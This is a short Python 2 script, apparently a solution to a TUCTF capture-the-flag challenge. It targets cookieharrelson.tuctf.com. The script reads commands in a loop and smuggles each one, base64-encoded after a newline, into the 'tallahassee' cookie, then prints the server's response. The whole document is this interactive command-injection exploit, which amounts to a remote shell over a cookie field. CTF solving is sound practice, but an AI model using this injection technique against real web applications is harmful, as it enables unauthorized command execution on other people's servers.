import requests,time,threading,base64
res=requests.get("http://cookieharrelson.tuctf.com/index.php")

print res.headers['Set-Cookie']
cookies={"tallahassee":""}
cookies['tallahassee']=base64.b64encode(cookies['tallahassee'])
print cookies['tallahassee']
while True:
	cmd=raw_input("Enter: ")
	cookies['tallahassee']=base64.b64encode("\n"+cmd)
	print cookies['tallahassee']
	res=requests.get("http://cookieharrelson.tuctf.com/index.php",cookies=cookies)
	print res.content